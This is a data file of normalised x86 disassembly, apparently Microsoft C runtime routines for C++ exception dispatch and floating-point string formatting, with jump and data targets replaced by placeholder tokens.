cmp eax 0x19930521
jb r-xdata
inc ecx
add edx 0x14
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] edx
cmp ecx [ ebp - 0x28 ]
jb r-xdata
cmp eax [ edx - 0xc ]
jg r-xdata
mov edi [ ebp - 0x14 ]
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x19930521
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
lea ebx [ edx - 0x10 ]
mov [ ebp - 0x2c ] ebx
mov ebx [ ebp + 0xc ]
cmp [ edx - 0x10 ] eax
jg r-xdata
xor ebx ebx
mov edi [ edx ]
mov [ ebp - 0xc ] edi
mov edi [ edx - 0x4 ]
test edi edi
mov [ ebp - 0x20 ] edi
mov edi [ ebp + 0x18 ]
jle r-xdata
mov eax ebx
mov [ ebp + 0x18 ] ebx
call sub_100435bc
cmp [ esi + 0x14 ] 0x19930522
jne r-xdata
push [ edi + 0x1c ]
push esi
call sub_10043ea9
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx [ ebp - 0xc ]
push 0x1
push esi
call sub_1004364c
pop ecx
pop ecx
lea eax [ ebp + 0x18 ]
mov [ ebp + 0x18 ] r--data
push eax
lea ecx [ ebp - 0x3c ]
call sub_1003e8a2
push r--data
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x3c ] r--data
push eax
call sub_1003e35b
mov eax [ ebp + 0x18 ]
inc ebx
add eax 0x10
mov [ ebp + 0x18 ] eax
cmp ebx [ edi ]
jl r-xdata
call sub_100424a8
call sub_100424a8
call sub_100424a8
mov [ eax + 0x88 ] esi
call sub_100424a8
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x8 ]
push esi
mov [ eax + 0x8c ] ecx
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] edx
test eax eax
jg r-xdata
mov ecx [ edi + 0x4 ]
push rw-data
mov ecx [ eax + ecx + 0x4 ]
call sub_1003e7ee
test al al
jne r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0x1c ]
mov eax [ edx ]
push eax
push ecx
mov [ ebp - 0x30 ] eax
call sub_100443ae
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x20 ]
add ecx 0x10
dec eax
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x20 ] eax
test eax eax
jg r-xdata
call sub_1003e6b2
push 0xffffffff
push edi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_100441f4
add esp 0x10
push [ edi + 0x1c ]
call sub_100438e8
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x2c ]
push [ ebp - 0x30 ]
push [ ebp - 0xc ]
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
push ebx
push esi
call sub_10043928
add esp 0x2c
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
dec eax
mov ecx [ ebp - 0xc ]
add edx 0x4
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
sub_10043d8d
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x80000003
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push ebx
push esi
call sub_100424a8
mov ebx [ ebp + 0x18 ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
call sub_100424a8
cmp [ eax + 0x80 ] esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push ebx
call sub_1003e602
mov ecx [ ebp - 0x8 ]
add esp 0x14
mov edx [ ebp - 0x4 ]
cmp ecx edx
jae r-xdata
call sub_100435bc
cmp [ edi ] 0xe0434f4d
je r-xdata
pop esi
pop ebx
lea esi [ eax + 0xc ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] 0xe0434352
je r-xdata
inc ecx
add esi 0x14
mov [ ebp - 0x8 ] ecx
cmp ecx edx
jb r-xdata
cmp eax [ esi - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_1003e52b
add esp 0x1c
test eax eax
jne r-xdata
cmp eax [ esi - 0xc ]
jl r-xdata
mov eax [ esi ]
mov edi [ esi + 0x4 ]
shl eax 0x4
mov edi [ edi + eax - 0xc ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
add edi 0xfffffff0
add eax edi
mov edi [ ebp + 0x8 ]
test [ eax ] 0x40
jne r-xdata
mov edx [ esi + 0x4 ]
mov ebx [ edx + eax - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ ebx + 0x8 ] 0x0
mov ebx [ ebp + 0x18 ]
jne r-xdata
mov eax [ ebp + 0x1c ]
push 0x1
push [ ebp + 0x24 ]
lea ecx [ esi - 0xc ]
push [ ebp + 0x20 ]
push ecx
push 0x0
push eax
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_10043928
mov edx [ ebp - 0x4 ]
add esp 0x2c
mov ecx [ ebp - 0x8 ]
sub_10043ea9
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
call sub_100435bc
xor ebx ebx
mov edi ebx
cmp [ esi ] ebx
jle r-xdata
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov ecx ebx
mov [ ebp + 0xc ] ebx
inc edi
add ecx 0x10
mov [ ebp + 0xc ] ecx
cmp edi [ esi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
mov eax [ esi + 0x4 ]
push [ edx ]
add eax ecx
push eax
call sub_100443ae
mov ecx [ ebp + 0xc ]
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
test eax eax
jle r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
dec eax
add edx 0x4
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edx
test eax eax
jg r-xdata
jmp r-xdata
sub_10043f31
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
mov eax [ ecx ]
mov esi [ ecx + 0x4 ]
add eax edx
test esi esi
js r-xdata
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ esi + edx ]
mov ecx [ edx + ecx ]
add ecx esi
add eax ecx
sub_10043f56
push 0x8
push r--data
call sub_1003f180
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test [ edx ] 0x80000000
je r-xdata
lea edi [ ecx + 0xc ]
add edi [ edx + 0x8 ]
mov edi ecx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_10043f31
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_1003e524
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push edx
push ecx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_10043fe4
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003f1c5
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_10043f31
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_1003e524
jmp r-xdata
sub_10043fe4
push 0xc
push r--data
call sub_1003f180
xor ebx ebx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] bl
je r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ eax ]
mov edi [ ebp + 0xc ]
test ecx ecx
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x14 ]
test cl cl
jns r-xdata
add edi 0xc
add edi edx
push 0x1
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test cl 0x8
je r-xdata
test [ esi ] 0x10
je r-xdata
test [ esi ] 0x1
je r-xdata
call sub_10047ac7
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
call sub_10047ac7
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_100435bc
push 0x1
push edi
call sub_10047ac7
pop ecx
pop ecx
test eax eax
je r-xdata
call eax
mov [ ebp + 0x10 ] eax
push 0x1
push eax
call sub_10047ac7
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10047ac7
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10047ac7
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_10047ac7
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
jmp r-xdata
push 0x1
push edi
call sub_10047ac7
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_10047ac7
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_10047ac7
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push edi
call sub_1003c640
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
mov [ edi ] ecx
lea eax [ esi + 0x8 ]
push eax
push ecx
mov ecx [ ebp + 0x10 ]
push [ esi + 0x18 ]
call sub_10047ac7
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
lea eax [ esi + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_10043f31
pop ecx
pop ecx
push eax
push edi
call sub_1003c640
add esp 0xc
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax ebx
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
test [ esi ] 0x4
push 0x0
pop ebx
setne bl
inc ebx
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_1003f1c5
retn
lea eax [ esi + 0x8 ]
push eax
push [ edi ]
jmp r-xdata
call sub_10043f31
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_100441a6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe0434352
je r-xdata
call sub_100424a8
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp [ eax ] 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_100424a8
dec [ eax + 0x90 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
call sub_100424a8
and [ eax + 0x90 ] 0x0
jmp sub_100435f4
sub_100441f4
push 0x10
push r--data
call sub_1003f180
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x4 ] 0x80
mov eax [ ebp + 0x8 ]
jg r-xdata
mov esi [ eax + 0x8 ]
movsx esi [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100442b3
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_100424a8
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] esi
call sub_1003f1c5
retn
call sub_100435bc
call sub_100435bc
mov eax [ ebp + 0x10 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x8 ]
mov edx [ eax + esi * 8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x1
cmp [ eax + esi * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
push 0x103
push eax
mov eax [ ecx + 0x8 ]
push [ eax + esi * 8 + 0x4 ]
call sub_10043570
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_100442cd
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_100424a8
mov ecx [ ebp + 0x18 ]
xor esi esi
mov edx [ ebp + 0x8 ]
mov ebx 0xe06d7363
mov edi 0x19930522
cmp [ eax + 0x3ac ] esi
jne r-xdata
test [ edx + 0x4 ] 0x66
je r-xdata
cmp [ edx ] ebx
je r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
cmp [ edx ] 0x80000026
je r-xdata
cmp [ edx ] ebx
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] esi
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax edi
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_100439f0
add esp 0x20
cmp [ edx + 0x10 ] 0x3
jb r-xdata
cmp [ ecx + 0x1c ] esi
je r-xdata
push 0xffffffff
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_100441f4
add esp 0x10
jmp r-xdata
test [ ecx + 0x20 ] 0x1
jne r-xdata
cmp [ edx + 0x14 ] edi
jbe r-xdata
mov eax [ edx + 0x1c ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x24 ]
movzx eax al
push eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call esi
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100443ae
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea ecx [ eax + 0x8 ]
cmp [ ecx ] 0x0
je r-xdata
test [ esi ] 0x80
mov edi [ ebp + 0xc ]
je r-xdata
mov edx [ edi + 0x4 ]
cmp eax edx
je r-xdata
test [ edi ] 0x10
jne r-xdata
test [ edi ] 0x2
je r-xdata
lea eax [ edx + 0x8 ]
push eax
push ecx
call sub_10044420
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test [ eax ] 0x1
je r-xdata
test [ esi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test [ eax ] 0x2
je r-xdata
test [ esi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ esi ] 0x2
je r-xdata
sub_10044420
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
or eax 0x1
retn
test al al
je r-xdata
test al al
je r-xdata
add ecx 0x1
test al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
test ah ah
je r-xdata
test ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
test al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
test ah ah
jne r-xdata
mov edi edi
sub_100444ac
push 0xc
push r--data
call sub_1003f180
push 0xe
call sub_10045009
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10044514
call sub_1003f1c5
retn
mov ecx [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_1003f3e3
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ ecx ] eax
jne r-xdata
mov edx ecx
jmp r-xdata
mov eax [ ecx + 0x4 ]
mov [ edx + 0x4 ] eax
push ecx
call sub_1003f3e3
pop ecx
mov [ ebp - 0x1c ] ecx
test ecx ecx
je r-xdata
sub_1004451d
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004453e
add esp 0x1c
pop ebp
retn
sub_1004453e
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10044a8f
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10044c49
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100445c4
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10044d0a
jmp r-xdata
sub_100445c4
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
push 0x30
pop eax
push [ ebp + 0x1c ]
mov ecx eax
mov [ ebp - 0x8 ] 0x3ff
mov [ ebp - 0x4 ] ecx
xor ebx ebx
lea ecx [ ebp - 0x2c ]
call sub_1003cf9b
mov edi [ ebp + 0x14 ]
test edi edi
jns r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
mov edi ebx
call sub_100417ee
push 0x16
jmp r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
pop edi
mov [ eax ] edi
call sub_1003fe28
jmp r-xdata
lea eax [ edi + 0xb ]
mov [ esi ] bl
cmp ecx eax
ja r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ebx [ edx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax ebx
shr eax 0x14
and eax 0x7ff
cmp eax 0x7ff
jne r-xdata
call sub_100417ee
push 0x22
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x24 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
xor eax eax
cmp eax eax
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov ebx [ ebp + 0x18 ]
push 0x30
pop eax
mov [ esi ] al
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
mov [ esi + 0x1 ] al
mov ecx [ edx + 0x4 ]
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
add ebx 0x27
xor eax eax
or eax ecx
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov [ esi ] 0x2d
inc esi
and ebx 0x80000000
or eax ebx
je r-xdata
or eax 0xffffffff
cmp ecx eax
je r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
push 0x30
pop eax
mov [ esi + 0x2 ] al
add esi 0x3
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
and eax 0xfffff
or ecx eax
jne r-xdata
push 0x0
push edi
push eax
lea ebx [ esi + 0x2 ]
push ebx
push edx
call sub_10044920
mov edi eax
add esp 0x14
test edi edi
je r-xdata
lea eax [ ecx - 0x2 ]
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ ecx ] al
mov [ ecx ] 0x0
jmp r-xdata
mov [ ebp - 0x8 ] 0x3fe
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
mov [ esi ] 0x0
jmp r-xdata
and [ ebp + 0x14 ] 0x0
mov ecx 0xf0000
mov eax [ ebp - 0x4 ]
mov [ ebp + 0xc ] ecx
cmp [ edx ] 0x0
jbe r-xdata
mov eax [ edx + 0x4 ]
and eax 0xfffff
mov [ ebp - 0x18 ] eax
ja r-xdata
mov ecx esi
inc esi
mov [ ebp - 0xc ] ecx
test edi edi
jne r-xdata
mov edi [ ebp + 0x18 ]
test edi edi
push 0x30
pop eax
mov [ esi ] al
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
lea eax [ esi + 0x2 ]
push 0x65
push eax
call sub_10047b60
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
test ax ax
js r-xdata
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp + 0x14 ]
and edx ecx
mov ecx [ ebp - 0x4 ]
and edx 0xfffff
movsx ecx cx
call sub_100480d0
push 0x30
pop ecx
add ax cx
movzx eax ax
cmp eax 0x39
jbe r-xdata
test edi edi
jle r-xdata
xor edi edi
jmp r-xdata
test edi edi
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp + 0x14 ]
and edx ecx
mov ecx [ ebp - 0x4 ]
and edx 0xfffff
movsx ecx cx
call sub_100480d0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ esi ] al
inc esi
mov eax [ ebp + 0x14 ]
shrd eax ecx 0x4
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x4 ]
shr ecx 0x4
sub eax 0x4
dec edi
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] eax
test ax ax
jns r-xdata
add eax ebx
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push edi
push 0x30
pop eax
push eax
push esi
call sub_10045ec0
add esp 0xc
add esi edi
push 0x30
lea eax [ esi - 0x1 ]
pop ebx
test edi edi
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
mov edx [ ebp + 0x8 ]
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edx ]
mov edx [ edx + 0x4 ]
call sub_100480d0
mov ecx eax
mov ebx edx
xor eax eax
and ecx 0x7ff
and ebx eax
sub ecx [ ebp - 0x8 ]
sbb ebx eax
js r-xdata
mov esi eax
mov [ eax ] bl
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg ecx
adc ebx eax
neg ebx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
mov ebx [ ebp - 0x10 ]
cmp eax [ ebp - 0xc ]
je r-xdata
cmp esi edi
jne r-xdata
mov edx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp ecx eax
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
push eax
push 0xa
push ebx
push ecx
call sub_10047ff0
add al 0x30
mov [ ebp - 0x18 ] edx
mov [ esi ] al
inc esi
mov [ ebp - 0x18 ] ebx
xor eax eax
cmp ebx eax
jl r-xdata
push eax
push edx
push ebx
push ecx
call sub_10047ff0
add al 0x30
mov [ ebp - 0x18 ] edx
mov [ esi ] al
inc esi
xor eax eax
cmp esi edi
jne r-xdata
cmp ecx edx
jb r-xdata
mov [ esi ] 0x30
mov edi esi
cmp ebx eax
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
add cl 0x30
mov edi eax
mov [ esi ] cl
mov [ esi + 0x1 ] al
jg r-xdata
push eax
push 0x64
push ebx
push ecx
call sub_10047ff0
add al 0x30
mov [ ebp - 0x18 ] edx
mov [ esi ] al
inc esi
xor eax eax
cmp ebx eax
jl r-xdata
cmp ecx 0xa
jb r-xdata
jg r-xdata
cmp ecx 0x64
jb r-xdata
sub_1004493e
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push edi
push [ ebp + 0x20 ]
call sub_1003cf9b
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
call sub_100417ee
push 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
pop edi
mov [ eax ] edi
call sub_1003fe28
jmp r-xdata
mov edx [ ebp + 0x10 ]
xor edi edi
mov eax edx
test edx edx
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
add eax 0x9
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edi
mov eax edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_100417ee
push 0x22
mov eax [ ebp + 0x18 ]
push esi
mov esi ebx
cmp [ eax ] 0x2d
jne r-xdata
mov ecx [ ebp + 0x18 ]
xor eax eax
test edx edx
setg al
push eax
xor eax eax
cmp [ ecx ] 0x2d
sete al
add eax ebx
push eax
call sub_10044f93
mov edx [ ebp + 0x10 ]
pop ecx
pop ecx
test edx edx
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x1c ] al
sete al
add eax edx
add esi eax
or eax 0xffffffff
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
mov [ esi ] al
inc esi
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
push r--data
push eax
push esi
call sub_1003d191
add esp 0xc
test eax eax
jne r-xdata
mov eax ebx
sub eax esi
add eax [ ebp + 0xc ]
push edi
push edi
push edi
push edi
push edi
call sub_1003fe38
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x14 ] edi
je r-xdata
mov edx [ ebp + 0x18 ]
mov eax [ edx + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop esi
je r-xdata
mov edx [ edx + 0x4 ]
dec edx
jns r-xdata
cmp [ ecx ] 0x30
jne r-xdata
push 0x64
pop ebx
cmp edx ebx
jl r-xdata
neg edx
mov [ esi + 0x1 ] 0x2d
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_1003c640
add esp 0xc
push 0xa
pop ebx
cmp edx ebx
jl r-xdata
mov eax edx
cdq
idiv ebx
add [ esi + 0x2 ] al
add [ esi + 0x4 ] dl
mov eax edx
cdq
idiv ebx
add [ esi + 0x3 ] al
sub_10044a8f
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10047f59
add esp 0x14
test edi edi
jne r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_100417ee
or ecx 0xffffffff
cmp esi ecx
je r-xdata
call sub_100417ee
push 0x16
pop esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1003c623
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebx + 0x1 ]
push eax
push ecx
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
xor eax eax
test ebx ebx
setg al
add ecx edi
add eax ecx
push eax
call sub_10047c97
add esp 0x10
test eax eax
je r-xdata
xor eax eax
mov ecx esi
cmp [ ebp - 0x2c ] 0x2d
sete al
sub ecx eax
xor eax eax
test ebx ebx
setg al
sub ecx eax
mov [ eax ] esi
call sub_1003fe28
mov eax esi
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
push ebx
push esi
push edi
call sub_1004493e
add esp 0x1c
mov [ edi ] 0x0
jmp r-xdata
sub_10044b5d
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x14 ]
